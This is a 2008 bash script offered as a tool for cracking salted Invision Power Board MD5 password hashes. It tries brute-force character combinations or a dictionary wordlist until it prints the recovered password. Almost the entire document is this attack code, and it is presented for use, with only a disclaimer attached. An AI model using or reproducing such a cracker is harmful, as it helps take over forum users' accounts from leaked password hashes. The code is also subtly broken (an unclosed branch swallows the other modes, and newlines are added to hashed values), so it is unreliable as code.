#!/usr/bin/env bash
# InvisionPowerBoard Cracker V1.0
# coded By 0x90 2008
# 0x90[at]bsdmail.org
# This small tool will bruteForce "Invision Power Board" MD5 hash
# work only on FreeBSD
#
#    I do not take any reponsibilty for what you do with this tool 
#    Hopefully it will make your life easier rather then making other 
#    peoples lives more difficult!
##############################
#  ___        ___   ___  
# / _ \      / _ \ / _ \ 
#| | | |_  _| (_) | | | |
#| | | \ \/ /\__, | | | |
#| |_| |>  <   / /| |_| |
# \___//_/\_\ /_/  \___/ 
##############################  

echo ".:: InvisionPowerBoard Cracker, Coded By 0x90 ::."
echo -n "Enter IPB md5 Hash: "
read hash
if [ -z "$hash" ] || [ "${#hash}" != "32" ]; then
echo "Error: please Enter a valid md5 hash"
exit
	fi
echo
echo -n "Enter IPB Salt: "
read salt
md5_salt=`echo "$salt" | md5sum | awk '{ print $1 }'`

echo -n "Select BruteForce Method:
1: Random BruteForce
2: Dictionary BruteForce
Enter your choise 1 or 2: "
read choise
if [ -z "$choise" ] || [ "$choise" != "1" ] && [ "$choise" != "2" ]; then
echo "Error: please choise between 1 or 2"
exit 1
	fi
#########################
# Random BruteForce
#########################

if [ "$choise" == "1" ]; then
echo "use Random method to crack"
echo "trying to bruteforce IPB MD5 hash ..."
	
echo -n "enter min lengh: "
read minlen
echo -n "enter max lengh: "
read maxlen

echo -n "Select bruteForce mode:
all, alnum, lower, upper, digit, alpha
> "
read mode

if [ "$mode" = "all" ]; then
char="a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ! # $ % & ' ( ) * + , - . / : ; & < = > ? @ [ \ ] ^ _ { | } ~"

if [ "$mode" = "alnum" ]; then
char="a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9"
	fi
if [ "$mode" = "alpha" ]; then
char="a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9"
	fi
if [ "$mode" = "lower" ]; then
char="a b c d e f g h i j k l m n o p q r s t u v w x y z"
	fi
if [ "$mode" = "upper" ]; then
char="A B C D E F G H I J K L M N O P Q R S T U V W X Y Z"
	fi
if [ "$mode" = "digit" ]; then
char="0 1 2 3 4 5 6 7 8 9"
	fi

bf(){
        for c in $char ; do

                nc=$[$nc+1]
                ch[$nc]=$c
        done
        for x in `seq 1 $[$maxlen+1]` ; do

                if [ $minlen -ge $x ] ; then
                        ci[$x]=1
                else
                        ci[$x]=0
                fi
        done
        for clen in `seq $minlen $maxlen` ; do

                while [ ${ci[$[$clen+1]]} -ne 1 ] ; do
                        wrd=""
                        for x in `seq $clen -1 1` ; do
                                wrd=$wrd${ch[${ci[$x]}]}
                        done

		
md5_hash=`echo "$wrd" | md5sum | awk '{ print $1 }'`
ipb_bf=`echo "$md5_salt$md5_hash" | md5sum | awk '{ print $1 }'`

echo "$wrd: hash: $ipb_bf"
if [ "$ipb_bf" == "$hash" ]; then
echo
echo "Cracked, IPB md5 password is: $wrd"
	exit 0
	fi
                        ci[1]=$[${ci[1]}+1]
                        for x in `seq 1 $clen`; do
                                if [ ${ci[$x]} -gt $nc ] ; then
                                        ci[$x]=1
                                        ci[$[$x+1]]=$[${ci[$[$x+1]]}+1]
                                fi
                        done
                done
        done
}

bf



fi
#########################
# Dictionary BruteForce
#########################
# Cain&Abel wordlist http://www.md5this.com/Wordlist.zip
# dont forget to convert the wordlist to Unix file format
# dos2unix Wordlist.txt
if [ "$choise" == "2" ]; then
echo "use dictionary method to crack"
echo -n "Enter dictionary name: "
read dic
echo "trying to bruteforce IPB MD5 hash ..."
	
n=`cat $dic | wc -l`

echo "we have $n password to try"
for (( i=1; i <= $n; i++));
	do
pass=`sed -n "$i"p $dic`
md5_hash=`echo "$pass" | md5sum | awk '{ print $1 }'`
ipb_bf=`echo "$md5_salt$md5_hash" | md5sum | awk '{ print $1 }'`

echo "$i: hash: $ipb_bf"

if [ "$ipb_bf" == "$hash" ]; then
echo
echo "Cracked, IPB md5 password is: $pass"
	exit 0
	fi
	done
fi
	exit
